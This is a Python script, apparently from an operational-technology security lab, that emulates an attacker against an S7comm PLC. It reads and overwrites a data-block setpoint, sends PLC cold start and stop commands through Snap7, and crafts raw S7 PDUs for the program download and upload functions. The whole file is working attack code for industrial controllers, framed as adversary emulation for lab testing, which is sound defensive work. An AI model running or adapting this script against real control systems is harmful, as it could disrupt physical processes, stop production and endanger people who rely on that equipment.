#!/usr/bin/env python3
"""
OT Security Lab - S7comm adversary emulation from a compromised workstation.

Uses the real Snap7 client over a legitimate Operations -> Control conduit for
the session-based operations (read/write variables and PLC cold start/stop). The
memory-card program download/upload service (FC 26-31) is not implemented by the
high-level client, so those jobs are issued as raw, well-formed S7 PDUs.
"""
import os
import socket
import time

from snap7.client import Client

HOST = os.getenv("OT_S7_HOST", "172.21.0.52")
PORT = int(os.getenv("OT_S7COMM_PORT", "102"))
DB_NUMBER = int(os.getenv("OT_S7COMM_DB", "1"))


def raw_s7_job(host, port, function_code, params=b"\x00" * 6):
    """Send one raw S7 job PDU (TPKT + COTP DT + S7 header)."""
    s7 = (
        b"\x32\x01\x00\x00"
        + b"\x00\x01"
        + (1 + len(params)).to_bytes(2, "big")
        + b"\x00\x00"
        + bytes([function_code])
        + params
    )
    frame = b"\x03\x00" + (4 + 3 + len(s7)).to_bytes(2, "big") + b"\x02\xf0\x80" + s7
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            sock.sendall(frame)
            time.sleep(0.2)
            sock.recv(2048)
    except OSError as error:
        print(f"[S7] raw job FC{function_code} socket error: {error}", flush=True)


def main():
    print(f"--- S7comm emulation against {HOST}:{PORT} ---", flush=True)
    client = Client()
    client.connect(HOST, 0, 1, tcp_port=PORT)
    try:
        data = client.db_read(DB_NUMBER, 0, 4)
        print(f"[S7] Read Var (FC4): DB{DB_NUMBER} = {bytes(data).hex()}", flush=True)
        client.db_write(DB_NUMBER, 0, b"\x01\x00\x00\x00")
        print("[S7] Write Var (FC5): DB setpoint written", flush=True)
        try:
            client.plc_cold_start()
            print("[S7] PLC Control (FC40): cold start requested", flush=True)
        except Exception as error:  # noqa: BLE001 - report and continue
            print(f"[S7] PLC Control error: {error}", flush=True)
        try:
            client.plc_stop()
            print("[S7] PLC Stop (FC41): stop requested", flush=True)
        except Exception as error:  # noqa: BLE001
            print(f"[S7] PLC Stop error: {error}", flush=True)
    finally:
        client.disconnect()

    for function_code, name in [
        (0x1A, "Request Download (FC26)"),
        (0x1B, "Download Block (FC27)"),
        (0x1C, "Download Ended (FC28)"),
        (0x1D, "Start Upload (FC29)"),
        (0x1E, "Upload (FC30)"),
        (0x1F, "End Upload (FC31)"),
    ]:
        raw_s7_job(HOST, PORT, function_code)
        print(f"[S7] {name}", flush=True)
        time.sleep(0.3)
    print("--- S7comm emulation complete ---", flush=True)


if __name__ == "__main__":
    main()
